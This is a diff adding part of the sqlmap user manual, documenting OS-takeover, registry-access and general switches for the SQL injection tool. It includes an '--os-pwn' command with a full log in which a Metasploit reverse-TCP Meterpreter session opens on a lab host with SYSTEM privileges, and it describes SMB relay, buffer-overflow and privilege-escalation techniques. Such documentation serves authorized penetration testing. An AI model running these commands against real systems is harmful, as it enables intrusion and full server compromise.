+* Database **in-memory execution of the Metasploit's shellcode** via sqlmap own user-defined function `sys_bineval()`. Supported on MySQL and PostgreSQL - switch `--os-pwn`.
+* Upload and execution of a Metasploit's **stand-alone payload stager** via sqlmap own user-defined function `sys_exec()` on MySQL and PostgreSQL or via `xp_cmdshell()` on Microsoft SQL Server - switch `--os-pwn`.
+* Execution of Metasploit's shellcode by performing a **SMB reflection attack** ([MS08-068](http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx)) with a UNC path request from the database server to
+the attacker's machine where the Metasploit `smb_relay` server exploit listens. Supported when running sqlmap with high privileges (`uid=0`) on Linux/Unix and the target DBMS runs as Administrator on Windows - switch `--os-smbrelay`.
+* Database in-memory execution of the Metasploit's shellcode by exploiting **Microsoft SQL Server 2000 and 2005
+`sp_replwritetovarbin` stored procedure heap-based buffer overflow** ([MS09-004](http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx)). sqlmap has its own exploit to trigger the
+vulnerability with automatic DEP memory protection bypass, but it relies on Metasploit to generate the shellcode to get executed upon successful exploitation - switch `--os-bof`.
+
+These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857) and in the
+slide deck [Expanding the control over the operating system from the database](http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database).
+
+Example against a MySQL target:
+
+    $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn \
+    --msf-path /software/metasploit
+
+    [...]
+    [hh:mm:31] [INFO] the back-end DBMS is MySQL
+    web server operating system: Windows 2003
+    web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
+    back-end DBMS: MySQL 5.0
+    [hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
+    [hh:mm:31] [INFO] the back-end DBMS operating system is Windows
+    how do you want to establish the tunnel?
+    [1] TCP: Metasploit Framework (default)
+    [2] ICMP: icmpsh - ICMP tunneling
+    > 
+    [hh:mm:32] [INFO] testing if current user is DBA
+    [hh:mm:32] [INFO] fetching current user
+    what is the back-end database management system architecture?
+    [1] 32-bit (default)
+    [2] 64-bit
+    > 
+    [hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
+    [hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
+    [hh:mm:33] [INFO] detecting back-end DBMS version from its banner
+    [hh:mm:33] [INFO] retrieving MySQL base directory absolute path
+    [hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
+    [hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
+    how do you want to execute the Metasploit shellcode on the back-end database underlying 
+    operating system?
+    [1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
+    [2] Stand-alone payload stager (file system way)
+    > 
+    [hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode 
+    which connection type do you want to use?
+    [1] Reverse TCP: Connect back from the database host to this machine (default)
+    [2] Reverse TCP: Try to connect back from the database host to this machine, on all ports 
+    between the specified and 65535
+    [3] Bind TCP: Listen on the database host for a connection
+    > 
+    which is the local address? [192.168.136.1] 
+    which local port number do you want to use? [60641] 
+    which payload do you want to use?
+    [1] Meterpreter (default)
+    [2] Shell
+    [3] VNC
+    > 
+    [hh:mm:40] [INFO] creation in progress ... done
+    [hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..
+
+                                    _
+                                    | |      o
+    _  _  _    _ _|_  __,   ,    _  | |  __    _|_
+    / |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
+    |  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
+                            /|
+                            \|
+
+
+        =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
+    + -- --=[ 674 exploits - 351 auxiliary
+    + -- --=[ 217 payloads - 27 encoders - 8 nops
+        =[ svn r12272 updated 4 days ago (2011.04.07)
+
+    PAYLOAD => windows/meterpreter/reverse_tcp
+    EXITFUNC => thread
+    LPORT => 60641
+    LHOST => 192.168.136.1
+    [*] Started reverse handler on 192.168.136.1:60641 
+    [*] Starting the payload handler...
+    [hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval', 
+    please wait..
+    [*] Sending stage (749056 bytes) to 192.168.136.129
+    [*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) at Mon Apr 11 
+    hh:mm:52 +0100 2011
+
+    meterpreter > Loading extension espia...success.
+    meterpreter > Loading extension incognito...success.
+    meterpreter > [-] The 'priv' extension has already been loaded.
+    meterpreter > Loading extension sniffer...success.
+    meterpreter > System Language : en_US
+    OS              : Windows .NET Server (Build 3790, Service Pack 2).
+    Computer        : W2K3R2
+    Architecture    : x86
+    Meterpreter     : x86/win32
+    meterpreter > Server username: NT AUTHORITY\SYSTEM
+    meterpreter > ipconfig
+
+    MS TCP Loopback interface
+    Hardware MAC: 00:00:00:00:00:00
+    IP Address  : 127.0.0.1
+    Netmask     : 255.0.0.0
+
+
+
+    Intel(R) PRO/1000 MT Network Connection
+    Hardware MAC: 00:0c:29:fc:79:39
+    IP Address  : 192.168.136.129
+    Netmask     : 255.255.255.0
+
+
+    meterpreter > exit
+
+    [*] Meterpreter session 1 closed.  Reason: User exit
+
+By default MySQL on Windows runs as `SYSTEM`, however PostgreSQL runs as a low-privileged user `postgres` on both Windows and Linux. Microsoft SQL Server 2000 by default runs as `SYSTEM`, whereas Microsoft SQL Server 2005 and 2008 run most of the times as `NETWORK SERVICE` and sometimes as `LOCAL SERVICE`. 
+
+It is possible to provide sqlmap with the `--priv-esc` switch to perform a **database process' user privilege escalation** via Metasploit's `getsystem` command which include, among others, the [kitrap0d](http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html) technique ([MS10-015](http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx)).
+
+## Windows registry access
+
+It is possible to access Windows registry when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and when the web application supports stacked queries. Also, session user has to have the needed privileges to access it. 
+### Read a Windows registry key value
+
+Switch: `--reg-read`
+
+Using this option you can read registry key values.
+
+### Write a Windows registry key value
+
+Switch: `--reg-add`
+
+Using this option you can write registry key values.
+
+### Delete a Windows registry key
+
+Switch: `--reg-del`
+
+Using this option you can delete registry keys.
+
+### Auxiliary registry switches
+
+Switches: `--reg-key`, `--reg-value`, `--reg-data` and `--reg-type`
+
+These switches can be used to provide data needed for proper running of options `--reg-read`, `--reg-add` and  `--reg-del`. So, instead of providing registry key information when asked, you can use them at command prompt as program arguments. 
+
+With `--reg-key` option you specify used Windows registry key path, with `--reg-value` value item name inside provided key, with `--reg-data` value data, while with `--reg-type` option you specify type of the value item.
+
+A sample command line for adding a registry key hive follows:
+
+    $ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add \ 
+    --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
+
+## General
+
+### Log HTTP(s) traffic to a textual file
+
+Switch: `-t`
+
+This switch requires an argument that specified the textual file to write all HTTP(s) traffic generated by sqlmap - HTTP(s) requests and HTTP(s) responses. 
+
+This is useful primarily for debug purposes.
+
+### Flush session files
+
+Switch: `--flush-session`
+
+As you are already familiar with the concept of a session file from the description above, it is good to know that you can flush the content of that file using option `--flush-session`. This way you can avoid the caching mechanisms implemented by default in sqlmap. Other possible way is to manually remove the session file(s). 
+
+### Ignores query results stored in session file
+
+Switch: `--fresh-queries`
+
+As you are already familiar with the concept of a session file from the description above, it is good to know that you can ignore the content of that file using option `--fresh-queries`. This way you can keep the session file untouched and for a selected run, avoid the resuming/restoring of queries output. 
+
+### Estimated time of arrival
+
+Switch: `--eta`
+
+It is possible to calculate and show in real time the estimated time of arrival to retrieve each query output. This is shown when the technique used to retrieve the output is any of the blind SQL injection types. 
+
+Example against an Oracle target affected only by boolean-based blind SQL injection:
+
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta
+
+    [...]
+    [hh:mm:01] [INFO] the back-end DBMS is Oracle
+    [hh:mm:01] [INFO] fetching banner
+    [hh:mm:01] [INFO] retrieving the length of query output
+    [hh:mm:01] [INFO] retrieved: 64
+    17% [========>                                          ] 11/64  ETA 00:19
+
+Then:
+
+    100% [===================================================] 64/64               
+    [hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod
+
+    web application technology: PHP 5.2.6, Apache 2.2.9
+    back-end DBMS: Oracle
+    banner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'
+
+As you can see, sqlmap first calculates the length of the query output, then estimates the time of arrival, shows the progress in percentage and counts the number of retrieved output characters. 
+
+### Update sqlmap
+
+Switch: `--update`
+
+Using this option you can update the tool to the latest development version directly from the subversion repository. You obviously need Internet access. 
+
+If, for any reason, this operation fails, run `git pull` from your sqlmap working copy. It will perform the exact same operation of switch `--update`. If you are running sqlmap on Windows, you can use the [SmartGit](http://www.syntevo.com/smartgit/index.html) client. 
+
+This is strongly recommended **before** reporting any bug to the [mailing lists](http://www.sqlmap.org/#ml).
+
+### Save options in a configuration INI file
+
+Switch: `--save`
+
+It is possible to save the command line options to a configuration INI file. The generated file can then be edited and passed to sqlmap with the `-c` option as explained above. 
+
+### Act in non-interactive mode
+
+Switch: `--batch`
+
+If you want sqlmap to run as a batch tool, without any user's interaction  when sqlmap requires it, you can force that by using `--batch` switch. This will leave sqlmap to go with a default behaviour whenever user's input would be required. 
+
+## Miscellaneous
+
+### IDS detection testing of injection payloads
+
+Switch: `--check-payload`
+
+Curious to see if a [decent intrusion detection system](http://www.phpids.org) (IDS) picks up sqlmap payloads? Use this switch!
+
+### Cleanup the DBMS from sqlmap specific UDF(s) and table(s)
+
+Switch: `--cleanup`
+
+It is recommended to clean up the back-end database management system from sqlmap temporary table(s) and created user-defined function(s) when you are done taking over the underlying operating system or file system. Switch `--cleanup` will attempt to clean up the DBMS and the file system wherever possible. 
+
+### Parse and test forms' input fields
+
+Switch: `--forms`
+
+Say that you want to test against SQL injections a huge _search form_ or you want to test a login bypass (typically only two input fields named like _username_ and _password_), you can either pass to sqlmap the request in a request file (`-r`), set the POSTed data accordingly (`--data`) or let sqlmap do it for you! 
+
+Both of the above mentioned instances, and many others, appear as ` <form>` and ` <input>` tags in HTML response bodies and this is where this switch comes into play.
+
+Provide sqlmap with `--forms` as well as the page where the form can be found as the target url (`-u`) and sqlmap will request the target url for you, parse the forms it has and guide you through to test for SQL injection on those form input fields (parameters) rather than the target url provided. 
+
+### Use Google dork results from specified page number
+
+Switch: `--gpage`
+
+Default sqlmap behavior with option `-g` is to do a Google search and use the first 100 resulting URLs for further SQL injection testing. However, in combination with this option you can specify with this switch, `--gpage`, some page other than the first one to retrieve target URLs from. 
+
+### Imitate smartphone
+
+Switch: `--mobile`
+
+[TODO]
+
+### Display page rank (PR) for Google dork results
+
+Switch: `--page-rank`
+
+Performs further requests to Google when `-g` is provided and display page rank (PR) for Google dork results.
+
+### Parse DBMS error messages from response pages
+
+Switch: `--parse-errors`
+
+If the web application is configured in debug mode so that it displays in the HTTP responses the back-end database management system error messages, sqlmap can parse and display them for you.
+
+This is useful for debugging purposes like understanding why a certain enumeration or takeover switch does not work - it might be a matter of session user's privileges and in this case you would see a DBMS error message along the lines of `Access denied for user  <SESSION USER>`. 
+
+### Replicate dumped data into a sqlite3 database
+
+Switch: `--replicate`
+
+If you want to store in a local SQLite 3 database file each dumped table (`--dump` or `--dump-all`), you can provide sqlmap with the `--replicate` switch at dump phase. This will create a ` <TABLE_NAME>.sqlite3` rather than a ` <DB_NAME>/ <TABLE_NAME>.csv` file into `output/TARGET_URL/dump/` directory. 
+
+You can then use sqlmap itself to read and query the locally created SQLite 3 file. For instance, `python sqlmap.py -d sqlite:///software/sqlmap/output/192.168.136.131/dump/testdb.sqlite3 --table`.
+
+### Simple wizard interface for beginner users
+
+Switch: `--wizard`
+
+Do you really want to know?
+
+# License and copyright
+
+sqlmap is released under the terms of the [General Public License v2](http://www.gnu.org/licenses/old-licenses/gpl-2.0.html). sqlmap is copyrighted by its [developers](http://sqlmap.org/#developers). 
+
+# Disclaimer
+
+
+sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
+
+
+Whatever you do with this tool is uniquely your responsibility. If you are not authorized to punch holes in the network you are attacking be aware that such action might get you in trouble with a lot of law enforcement agencies.
+
+
+# Authors
+
+[Bernardo Damele A. G.](mailto:bernardo@sqlmap.org) (inquis)
+
+[Miroslav Stampar](http://about.me/stamparm) (stamparm)
